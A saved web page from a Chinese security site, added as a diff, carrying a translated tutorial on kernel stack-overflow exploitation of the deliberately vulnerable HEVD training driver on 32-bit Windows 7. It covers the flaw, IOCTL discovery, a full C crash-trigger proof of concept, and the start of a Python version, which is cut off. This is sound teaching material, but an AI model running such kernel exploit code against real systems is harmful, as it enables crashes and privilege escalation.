@@ -1,0 +1,755 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】Windows 内核攻击：栈溢出 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="内核攻击,windows安全,栈溢出,缓冲区溢出"/>
+    
+        <meta name="description" content="Windows有很多种驱动需要我们了解，比如用于开发的驱动、用于调试的驱动。本文将仅关注对于开发驱动的攻击，与此同时我也会简要介绍其内部结构。本文主要介绍了在HackSysExtremeVulnerableDriver上的一次基于栈的缓冲区溢出攻击。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】Windows 内核攻击：栈溢出</h2>
+                <div class="article-msg">
+                    <span class="time">2017-04-11 10:24:11</span>
+                    
+                                        <span class="read">阅读：11554次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_3712"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="3712" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="https://osandamalith.com/2017/04/05/windows-kernel-exploitation-stack-overflow/"
+                             target="_blank">来源： osandamalith.com</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2671379114" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t011ab6d4487561d255.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2671379114" style="color:#848e99;">村雨其实没有雨</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; word-break: break-all; background-color: rgb(255, 255, 255); text-indent: 0em; text-align: center;"><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; font-weight: 900;"><img src="http://p2.qhimg.com/t01c2f56e05c0059643.jpg" title="t01c2f56e05c0059643.jpg" alt="http://p2.qhimg.com/t01c2f56e05c0059643.jpg"/></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; word-break: break-all; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; font-weight: 900;">翻译：</span><a href="http://bobao.360.cn/member/contribute?uid=2671379114" target="_self" textvalue="360U2671379114"><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; font-weight: 900;">村雨其实没有雨</span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">预估稿费：200RMB</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">介绍</span></strong></span><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">本文介绍了在<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver" target="_self">HackSysExtremeVulnerableDriver</a>上的一次基于栈的缓冲区溢出攻击。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Windows有很多种驱动需要我们了解，比如用于开发的驱动、用于调试的驱动。本文将仅关注对于开发驱动的攻击，与此同时我也会简要介绍其内部结构。在阅读本文时，我们假设您已经具有了C语言基础、用户级调试(debugging in the userland)的相关经验。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">该驱动是内核驱动，驱动程序通常用于将代码导入内核。未处理的异常将会导致“死亡蓝屏”(Blue Screen of Death)。此处我使用Windows 7 32位系统进行演示，因为它不支持SMEP (Supervisor Mode Execution Prevention) 或 SMAP (Supervisor Mode Access Prevention)。换言之，当SMEP启用时，只要ring0尝试从标有用户位的页面执行代码，CPU就会故障。而当它未被启用时，我们就能通过shellcode窃取系统的token。您可以通过阅读Shellcode分析部分来进行验证。在64位系统上触发该漏洞需要不同的利用代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">您可以通过<a href="https://www.osronline.com/article.cfm?article=157" target="_self">OSR Driver Loader</a>来将驱动程序导入系统，而如果要使用windbg来调试机器，您可以用<a href="http://virtualkd.sysprogs.org/" target="_self">VirtualKD</a>或<a href="https://technet.microsoft.com/en-us/sysinternals/livekd.aspx" target="_self">LiveKD</a>。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">您可以使用VirtualBox或VMware添加新的串行连接，来通过windbg调试guest虚拟机系统。我将使用VMware的串行连接。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">关于内核数据结构，可以参考<a href="http://www.codemachine.com/article_kernelstruct.html" target="_self">这里</a>，我大多是用它来作结构上的参考。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当驱动注册完毕后，你可以看到&quot;msinfo32&quot;</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t0191605a0eeee8add5.png" title="t01ef18426e08567598.png" alt="http://p1.qhimg.com/t01ef18426e08567598.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果检查系统进程中已加载模块，可以看到我们的内核驱动&quot;HEVD.sys&quot;</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t01fb2ba06126fd203e.png" title="t01dbed0b3e0ab1d230.png" alt="http://p4.qhimg.com/t01dbed0b3e0ab1d230.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在windbg中，能够看到debug输出了HEVD的logo</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t0171f51e2282d2e72c.png" title="t01bbb2b8c00c320b68.png" alt="http://p7.qhimg.com/t01bbb2b8c00c320b68.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">查看已加载模块能够看到HEVD</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t0101452fbf8836de59.png" title="t01380a2302c68f9b8a.png" alt="http://p4.qhimg.com/t01380a2302c68f9b8a.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">漏洞</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">漏洞位于&quot;memcpy&quot;函数中，在<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/StackOverflow.c" target="_self">这里</a>已经有了详尽的分析</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t017eaa53313f29e53c.png" title="t01b38ef44c320da283.png" alt="http://p7.qhimg.com/t01b38ef44c320da283.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">驱动分析</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">为了创建驱动程序的句柄，我们将使用&quot;CreateFile&quot;的API。为了从用户界面与驱动程序通信，我们将使用&quot;DeviceIoControl&quot;API。我们必须指定正确的IOCTL代码来触发栈溢出的漏洞。Windows使用I/O请求数据包(IRPs)来描述对内核的I/O请求。IRP调度程序储存在&quot;MajorFunction&quot;数组中。Windows具有预定义的一组IRP的主要功能，用于描述来自用户界面的每个I/O请求。每当收到来自用户界面的I/O请求，I/O管理器都将调用相应的IRP主要功能处理程序。例如，当&quot;CreateFile&quot;被调用时，&quot;IRP_MJ_CREATE&quot;这一IRP主要功能就会来进行处理，当&quot;DeviceIoControl&quot;被调用时，&quot;IRP_MJ_DEVICE_CONTROL&quot;就会进行处理。在该驱动程序的驱动功能上，我们能看到以下内容：</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t014d5ad6ccfb2f4203.png" title="t017e082de2f042a9df.png" alt="http://p7.qhimg.com/t017e082de2f042a9df.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了调用&quot;DeviceIoControl&quot;，我们需要找到相应的IOCTL代码。由于我们有源码，这一过程可以通过查找来实现，或者我们还可以去逆向分析已经编译好的驱动。IOCTF即I/O 控制代码，它是一个32位整数，用于用于对设备类型，操作特定代码，缓冲方法和安全访问进行编码。我们使用CTL_CODE宏来定义IOCTLS。要触发堆栈溢出漏洞，我们必须使用“HACKSYS_EVD_IOCTL_STACK_OVERFLOW”IOCTL代码。</span></p><p style="text-indent: 2em; text-align: left;"><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/Common.h" _src="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/Common.h" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/Common.h</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t01889758904cec3a2f.png" title="t0106af09f867c440de.png" alt="http://p9.qhimg.com/t0106af09f867c440de.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">您可以在漏洞利用过程中使用上述的宏，或者使用IDA来定位跳转到位于“IrpDeviceIoCtlHandler”例程的栈溢出IOCTL代码</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t01e54ea03e710bdacd.png" title="t01c0c453ca5135f414.png" alt="http://p2.qhimg.com/t01c0c453ca5135f414.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在windbg中，您可以查看HEVD的驱动程序信息。在偏移0x38这里，您可以看到&#39;MajorFunction&#39;数组。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01a2988b4069baf549.png" title="t01adfb8f0d217df4ad.png" alt="http://p2.qhimg.com/t01adfb8f0d217df4ad.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">要找到&#39;IrpDeviceIoCtlHandler&#39;例程，我们可以执行这个指针运算。0xe是IRP_MJ_DEVICE_CONTROL的索引。一旦我们重新组装了指针，我们就可以看到我们找到了正确的例程。</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t0161e44fe593938040.png" title="t015af5904308e6fb09.png" alt="http://p8.qhimg.com/t015af5904308e6fb09.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">可以在windbg中进一步分析这个例程，查看这个0x222003 IOCTL在哪里。</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t011d599265ca42a1ae.png" title="t018e0081fa39d8ce36.png" alt="http://p6.qhimg.com/t018e0081fa39d8ce36.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果我们遵循jz指令，则会导致堆栈溢出程序打印调试消息&quot;** HACKSYS_EVD_STACKOVERFLOW **&quot;</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t0105200a09eb0209bf.png" title="t014f3610b03f8e79bc.png" alt="http://p4.qhimg.com/t014f3610b03f8e79bc.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">触发漏洞</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">既然我们已经了解了IOCTL指令，现在让我们来触发这个漏洞。我将向其发送一个巨大的缓存，最终将造成蓝屏</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">//&nbsp;源码地址：https://github.com/OsandaMalith/Exploits/blob/master/HEVD/StackOverflowBSOD.c
+#include&nbsp;&quot;stdafx.h&quot;
+#include&nbsp;&lt;Windows.h&gt;
+#include&nbsp;&lt;string.h&gt;
+/*
+&nbsp;*&nbsp;Title:&nbsp;HEVD&nbsp;x86&nbsp;Stack&nbsp;Overflow&nbsp;BSOD
+&nbsp;*&nbsp;Platform:&nbsp;Windows&nbsp;7&nbsp;x86
+&nbsp;*&nbsp;Author:&nbsp;Osanda&nbsp;Malith&nbsp;Jayathissa&nbsp;(@OsandaMalith)
+&nbsp;*&nbsp;Website:&nbsp;https://osandamalith.com
+&nbsp;*/
+int&nbsp;_tmain(int&nbsp;argc,&nbsp;_TCHAR*&nbsp;argv[])
+{
+&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hDevice;
+&nbsp;&nbsp;&nbsp;&nbsp;LPCWSTR&nbsp;lpDeviceName&nbsp;=&nbsp;L&quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;;
+&nbsp;&nbsp;&nbsp;&nbsp;PUCHAR&nbsp;lpInBuffer&nbsp;=&nbsp;NULL;
+&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;lpBytesReturned&nbsp;=&nbsp;0;
+&nbsp;&nbsp;&nbsp;&nbsp;hDevice&nbsp;=&nbsp;CreateFile(
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lpDeviceName,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GENERIC_READ&nbsp;|&nbsp;GENERIC_WRITE,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE_SHARE_WRITE,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OPEN_EXISTING,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FILE_FLAG_OVERLAPPED&nbsp;|&nbsp;FILE_ATTRIBUTE_NORMAL,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL);
+&nbsp;&nbsp;&nbsp;&nbsp;wprintf(L&quot;[*]&nbsp;Author:&nbsp;@OsandaMalith\n[*]&nbsp;Website:&nbsp;https://osandamalith.com\n\n&quot;);
+&nbsp;&nbsp;&nbsp;&nbsp;wprintf(L&quot;[+]&nbsp;lpDeviceName:&nbsp;%ls\n&quot;,&nbsp;lpDeviceName);
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(hDevice&nbsp;==&nbsp;INVALID_HANDLE_VALUE)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wprintf(L&quot;[!]&nbsp;Failed&nbsp;to&nbsp;get&nbsp;a&nbsp;handle&nbsp;to&nbsp;the&nbsp;driver.&nbsp;0x%x\n&quot;,&nbsp;GetLastError());
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-1;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;wprintf(L&quot;[+]&nbsp;Device&nbsp;Handle:&nbsp;0x%x\n&quot;,&nbsp;hDevice);
+&nbsp;&nbsp;&nbsp;&nbsp;lpInBuffer&nbsp;=&nbsp;(PUCHAR)HeapAlloc(GetProcessHeap(),&nbsp;HEAP_ZERO_MEMORY,&nbsp;0x900);
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!lpInBuffer)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wprintf(L&quot;[!]&nbsp;Failed&nbsp;to&nbsp;allocated&nbsp;memory.&nbsp;%x&quot;,&nbsp;GetLastError());
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;-1;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;RtlFillMemory(lpInBuffer,&nbsp;(SIZE_T)1024*sizeof&nbsp;DWORD,&nbsp;0x41);
+&nbsp;&nbsp;&nbsp;&nbsp;wprintf(L&quot;[+]&nbsp;Sending&nbsp;IOCTL&nbsp;request&nbsp;with&nbsp;buffer:&nbsp;0x222003\n&quot;);
+&nbsp;&nbsp;&nbsp;&nbsp;DeviceIoControl(
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hDevice,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x222003,&nbsp;//&nbsp;IOCTL
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(LPVOID)lpInBuffer,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2084,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;lpBytesReturned,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL);
+&nbsp;&nbsp;&nbsp;&nbsp;HeapFree(GetProcessHeap(),&nbsp;0,&nbsp;(LPVOID)lpInBuffer);
+&nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hDevice);
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;
+}
+//EOF</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里是Python版</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">#&nbsp;https://github.com/OsandaMalith/Exploits/blob/master/HEVD/StackOverflowBSOD.py
+from&nbsp;ctypes&nbsp;import&nbsp;*
+from&nbsp;ctypes.wintypes&nbsp;import&nbsp;*
+#&nbsp;Title&nbsp;:&nbsp;HEVD&nbsp;x86&nbsp;Stack&nbsp;Overflow&nbsp;BSOD
+#&nbsp;Platform:&nbsp;Windows&nbsp;7&nbsp;x86
+#&nbsp;Author:&nbsp;Osanda&nbsp;Malith&nbsp;Jayathissa&nbsp;(@OsandaMalith)
+#&nbsp;Website:&nbsp;https://osandamalith.com
+kernel32&nbsp;=&nbsp;windll.kernel32
+def&nbsp;main():
+&nbsp;&nbsp;&nbsp;&nbsp;lpBytesReturned&nbsp;=&nbsp;c_ulong()
